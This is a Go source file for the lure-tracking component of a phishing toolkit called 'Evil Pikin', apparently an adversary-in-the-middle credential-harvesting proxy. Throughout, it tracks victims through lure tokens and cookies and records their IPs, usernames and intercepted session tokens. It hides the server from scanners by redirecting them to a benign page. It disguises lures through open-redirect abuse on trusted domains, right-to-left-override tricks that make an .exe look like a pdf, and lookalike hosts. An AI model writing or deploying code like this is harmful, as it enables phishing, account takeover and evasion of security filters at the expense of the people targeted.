// Package lures implements the tracking matrix for Evil Pikin: uniquely-tracked
// phishing entry points (lures), the live victim sessions they create, and the
// masking helpers used to make lure URLs evade filters. It is deliberately
// dependency-light so both the standalone pkg/proxy engine and the live
// internal/proxy engine can share one Registry instance.
package lures

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"sync"
	"time"
)

const (
	// SessionCookieName is the tracking cookie dropped in the victim browser.
	SessionCookieName = "EP_SESS"
	// DefaultParamName is the query parameter carrying the lure token.
	DefaultParamName = "id"
	// DefaultSafeRedirect is where un-authorized crawlers are bounced to hide
	// the server from scanners (the "benign page" sink).
	DefaultSafeRedirect = "https://www.google.com"
	// sessionTokenBytes controls the entropy of the EP_SESS cookie value.
	sessionTokenBytes = 16
	// lureIDBytes controls the entropy of the generated lure id.
	lureIDBytes = 6
)

// Lure is a uniquely-tracked phishing entry point. A victim who arrives with the
// matching ?id= token is bound to TargetProfile and served the real login screen.
type Lure struct {
	ID            string
	Path          string // deceptive serve path, e.g. "login-reset" -> /login-reset
	TargetProfile string // proxy host / target key this lure unlocks
	RedirectURL   string // optional post-capture decoy destination
	// LandingPath is the REAL upstream path the proxy fetches when this lure is
	// hit (e.g. "/" for the Microsoft login page). It must be a genuine origin
	// path — forwarding the deceptive Path verbatim 404s on the origin and yields
	// a blank page. Empty => resolved from the target's redirect_url at request
	// time, which is the correct default for most login lures.
	LandingPath string
	IsActive    bool
	CreatedAt   time.Time
}

// Session is the live victim session bound to a lure token + EP_SESS cookie.
// The TUI dashboard reads these to show who clicked, what they typed, and when
// their token was captured.
type Session struct {
	Token         string
	LureID        string
	TargetProfile string
	ClientIP      string
	UserAgent     string
	FirstSeen     time.Time
	LastSeen      time.Time
	Pages         []string
	Username      string
	TokenCaptured bool
}

// Persistence mirrors lure changes to durable storage so they survive process
// restarts. It is intentionally storage-agnostic; the console wires a SQLite
// backing store via SetPersistence. A nil Persistence means in-memory only.
type Persistence interface {
	SaveLure(*Lure) error
	DeleteLure(id string) error
	SetLureActive(id string, active bool) error
}

// Registry is a concurrency-safe store of lures and their live sessions. It is
// safe to share between the proxy hot path (read-heavy validation) and the
// control plane (writes when operators generate lures).
type Registry struct {
	mu       sync.RWMutex
	lures    map[string]*Lure
	byPath   map[string]string // path -> lure id (active lures only)
	sessions map[string]*Session
	persist  Persistence
}

// NewRegistry returns an initialized, empty registry.
func NewRegistry() *Registry {
	return &Registry{
		lures:    make(map[string]*Lure),
		byPath:   make(map[string]string),
		sessions: make(map[string]*Session),
	}
}

// SetPersistence attaches a durable store. When set, Create/Delete/SetActive
// mirror to storage so lures survive restarts. Safe to call once at startup.
func (r *Registry) SetPersistence(p Persistence) { r.persist = p }

// LoadLures registers previously-persisted lures into memory WITHOUT re-writing
// storage (avoids persistence loops on startup load).
func (r *Registry) LoadLures(ls []*Lure) {
	r.mu.Lock()
	defer r.mu.Unlock()
	for _, l := range ls {
		r.addLocked(l)
	}
}

// addLocked inserts a lure into the in-memory maps. Caller must hold r.mu.
func (r *Registry) addLocked(l *Lure) {
	r.lures[l.ID] = l
	if l.IsActive {
		r.byPath[l.Path] = l.ID
	} else {
		if r.byPath[l.Path] == l.ID {
			delete(r.byPath, l.Path)
		}
	}
}

func genHex(n int) string {
	b := make([]byte, n)
	if _, err := rand.Read(b); err != nil {
		// crypto/rand is backed by the OS; a failure here is unrecoverable.
		panic(fmt.Sprintf("lures: entropy source failed: %v", err))
	}
	return hex.EncodeToString(b)
}

// Create registers a new lure with a random id and returns it. path maps to the
// URL segment; targetProfile is the proxy host this lure unlocks; redirect is an
// optional post-capture decoy. When a Persistence backend is attached, the lure
// is also written to durable storage so it survives restarts.
func (r *Registry) Create(path, targetProfile, redirect string) (*Lure, error) {
	if strings.TrimSpace(path) == "" {
		return nil, fmt.Errorf("lure path is required")
	}
	r.mu.Lock()
	l := &Lure{
		ID:            nextLureID(r.lures),
		Path:          strings.Trim(path, "/"),
		TargetProfile: targetProfile,
		RedirectURL:   redirect,
		IsActive:      true,
		CreatedAt:     time.Now(),
	}
	r.addLocked(l)
	r.mu.Unlock()
	if r.persist != nil {
		if err := r.persist.SaveLure(l); err != nil {
			return l, err
		}
	}
	return l, nil
}

// nextLureID returns a sequential integer lure id (as a string) one greater
// than the highest numeric id currently registered. Legacy non-numeric ids
// (e.g. old hex tokens) are ignored so numbering stays clean for new lures.
func nextLureID(lures map[string]*Lure) string {
	max := 0
	for id := range lures {
		if n, err := strconv.Atoi(id); err == nil && n > max {
			max = n
		}
	}
	return strconv.Itoa(max + 1)
}

// Get returns the lure for an id regardless of active state.
func (r *Registry) Get(id string) (*Lure, bool) {
	r.mu.RLock()
	defer r.mu.RUnlock()
	l, ok := r.lures[id]
	return l, ok
}

// Validate returns the lure only if the id exists and is active — this is the
// gate the proxy calls on every inbound request.
func (r *Registry) Validate(id string) (*Lure, bool) {
	r.mu.RLock()
	defer r.mu.RUnlock()
	l, ok := r.lures[id]
	if !ok || !l.IsActive {
		return nil, false
	}
	return l, true
}

// LookupByPath resolves a registered active lure from its path segment.
func (r *Registry) LookupByPath(path string) (*Lure, bool) {
	r.mu.RLock()
	defer r.mu.RUnlock()
	id, ok := r.byPath[strings.Trim(path, "/")]
	if !ok {
		return nil, false
	}
	l, ok := r.lures[id]
	if !ok || !l.IsActive {
		return nil, false
	}
	return l, true
}

// List returns all registered lures.
func (r *Registry) List() []*Lure {
	r.mu.RLock()
	defer r.mu.RUnlock()
	out := make([]*Lure, 0, len(r.lures))
	for _, l := range r.lures {
		out = append(out, l)
	}
	return out
}

// SetActive enables or disables a lure.
func (r *Registry) SetActive(id string, active bool) bool {
	r.mu.Lock()
	l, ok := r.lures[id]
	if !ok {
		r.mu.Unlock()
		return false
	}
	l.IsActive = active
	if active {
		r.byPath[l.Path] = l.ID
	} else {
		if r.byPath[l.Path] == l.ID {
			delete(r.byPath, l.Path)
		}
	}
	r.mu.Unlock()
	if r.persist != nil {
		_ = r.persist.SetLureActive(id, active)
	}
	return true
}

// Delete removes a lure (and its path mapping) from the registry.
func (r *Registry) Delete(id string) bool {
	r.mu.Lock()
	l, ok := r.lures[id]
	if !ok {
		r.mu.Unlock()
		return false
	}
	delete(r.lures, id)
	if r.byPath[l.Path] == id {
		delete(r.byPath, l.Path)
	}
	r.mu.Unlock()
	if r.persist != nil {
		_ = r.persist.DeleteLure(id)
	}
	return true
}

// BindSession records (or refreshes) the session tied to an EP_SESS token.
func (r *Registry) BindSession(token, lureID, profile, clientIP, ua string) *Session {
	r.mu.Lock()
	defer r.mu.Unlock()
	s, ok := r.sessions[token]
	if !ok {
		s = &Session{
			Token:         token,
			LureID:        lureID,
			TargetProfile: profile,
			ClientIP:      clientIP,
			UserAgent:     ua,
			FirstSeen:     time.Now(),
		}
		r.sessions[token] = s
	}
	s.LastSeen = time.Now()
	if s.ClientIP == "" {
		s.ClientIP = clientIP
	}
	if s.UserAgent == "" {
		s.UserAgent = ua
	}
	return s
}

// GetSession returns the session for a token, if any.
func (r *Registry) GetSession(token string) (*Session, bool) {
	r.mu.RLock()
	defer r.mu.RUnlock()
	s, ok := r.sessions[token]
	return s, ok
}

// Touch records that the victim viewed a page (deduped by last entry).
func (r *Registry) Touch(token, page string) {
	r.mu.Lock()
	defer r.mu.Unlock()
	s, ok := r.sessions[token]
	if !ok {
		return
	}
	s.LastSeen = time.Now()
	if n := len(s.Pages); n == 0 || s.Pages[n-1] != page {
		s.Pages = append(s.Pages, page)
	}
}

// RecordCredential notes the username the victim submitted (for the dashboard).
func (r *Registry) RecordCredential(token, username string) {
	r.mu.Lock()
	defer r.mu.Unlock()
	if s, ok := r.sessions[token]; ok {
		s.Username = username
		s.LastSeen = time.Now()
	}
}

// RecordTokenCaptured flags that a session token was intercepted.
func (r *Registry) RecordTokenCaptured(token string) {
	r.mu.Lock()
	defer r.mu.Unlock()
	if s, ok := r.sessions[token]; ok {
		s.TokenCaptured = true
		s.LastSeen = time.Now()
	}
}

// ListSessions returns all live victim sessions.
func (r *Registry) ListSessions() []*Session {
	r.mu.RLock()
	defer r.mu.RUnlock()
	out := make([]*Session, 0, len(r.sessions))
	for _, s := range r.sessions {
		out = append(out, s)
	}
	return out
}

// --- HTTP / session helpers shared by both proxy engines ---------------------

// ParamName normalizes an empty param name to the default.
func ParamName(p string) string {
	if p == "" {
		return DefaultParamName
	}
	return p
}

// HasSessionCookie reports whether the request already carries an EP_SESS cookie.
func HasSessionCookie(r *http.Request) bool {
	for _, c := range r.Cookies() {
		if c.Name == SessionCookieName {
			return true
		}
	}
	return false
}

// SetSessionCookie ensures an EP_SESS cookie is present. If one already exists it
// returns its value; otherwise it generates a token, sets a hardened cookie
// (HttpOnly, Secure, scoped to the given domain when non-empty), and returns it.
func SetSessionCookie(w http.ResponseWriter, r *http.Request, domain string) string {
	if c, err := r.Cookie(SessionCookieName); err == nil && c.Value != "" {
		return c.Value
	}
	tok := genHex(sessionTokenBytes)
	domainAttr := ""
	if domain != "" {
		if !strings.HasPrefix(domain, ".") {
			domain = "." + domain
		}
		domainAttr = domain
	}
	http.SetCookie(w, &http.Cookie{
		Name:     SessionCookieName,
		Value:    tok,
		Path:     "/",
		Domain:   domainAttr,
		HttpOnly: true,
		Secure:   true,
		SameSite: http.SameSiteLaxMode,
	})
	return tok
}

// StripParam removes the lure token from the request before it is forwarded to
// the real upstream, so the target site never sees the tracking id.
func StripParam(r *http.Request, param string) {
	param = ParamName(param)
	q := r.URL.Query()
	if _, ok := q[param]; !ok {
		return
	}
	q.Del(param)
	r.URL.RawQuery = q.Encode()
}

// ClientIP extracts the originating IP, honoring X-Forwarded-For when present.
func ClientIP(r *http.Request) string {
	if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
		return strings.TrimSpace(strings.Split(xff, ",")[0])
	}
	if host, _, err := net.SplitHostPort(r.RemoteAddr); err == nil {
		return host
	}
	return r.RemoteAddr
}

// SafeRedirect bounces the client to a benign page to hide the server from
// scanners/crawlers that arrive without a valid lure token or session cookie.
func SafeRedirect(w http.ResponseWriter, r *http.Request, safe string) {
	if safe == "" {
		safe = DefaultSafeRedirect
	}
	http.Redirect(w, r, safe, http.StatusFound)
}

// --- Masking helpers ---------------------------------------------------------

func parseMaybeHost(s string) *url.URL {
	if strings.Contains(s, "://") {
		if u, err := url.Parse(s); err == nil {
			return u
		}
	}
	return &url.URL{Scheme: "https", Host: s}
}

// TrackingURL builds the canonical lure URL: https://<base>/<path>?<param>=<id>.
func (l Lure) TrackingURL(base, param string) string {
	param = ParamName(param)
	u := parseMaybeHost(base)
	if u.Path == "" {
		u.Path = "/" + strings.Trim(l.Path, "/")
	} else {
		u.Path = strings.TrimSuffix(u.Path, "/") + "/" + strings.Trim(l.Path, "/")
	}
	q := u.Query()
	q.Set(param, l.ID)
	u.RawQuery = q.Encode()
	return u.String()
}

// OpenRedirectLure builds a lure that rides a trusted domain's query-based open
// redirect sink to reach the phishing host. Operators supply the vulnerable path
// and the real phishing URL; the helper fans out the common param names.
func OpenRedirectLure(trustedBase, vulnerablePath, phishingURL string) string {
	u := parseMaybeHost(trustedBase)
	u.Path = vulnerablePath
	q := u.Query()
	for _, k := range []string{"url", "next", "redirect", "r", "to", "u"} {
		q.Set(k, phishingURL)
	}
	u.RawQuery = q.Encode()
	return u.String()
}

// RLOHideExtension uses U+202E (RIGHT-TO-LEFT OVERRIDE) so a malicious extension
// appears benign. e.g. RLOHideExtension("invoice", "pdf", "exe") yields a name
// that visually reads "invoice_pdf.exe".
func RLOHideExtension(base, visibleExt, realExt string) string {
	const rlo = "\u202e"
	rev := reverseRunes(realExt + "." + visibleExt)
	return base + rlo + rev
}

func reverseRunes(s string) string {
	r := []rune(s)
	for i, j := 0, len(r)-1; i < j; i, j = i+1, j-1 {
		r[i], r[j] = r[j], r[i]
	}
	return string(r)
}

// ShortURL renders a link-shortener style lure. The operator controls the short
// domain; the real tracking URL is bound server-side to the token.
func ShortURL(shortDomain, code string) string {
	return "https://" + shortDomain + "/" + code
}

// SpoofableURL returns a lure URL whose host is a lookalike of the proxied
// domain (operator supplies the homoglyph/punycode variant).
func SpoofableURL(lookalikeHost, path, id string) string {
	u := &url.URL{Scheme: "https", Host: lookalikeHost, Path: "/" + strings.Trim(path, "/")}
	q := u.Query()
	q.Set(DefaultParamName, id)
	u.RawQuery = q.Encode()
	return u.String()
}
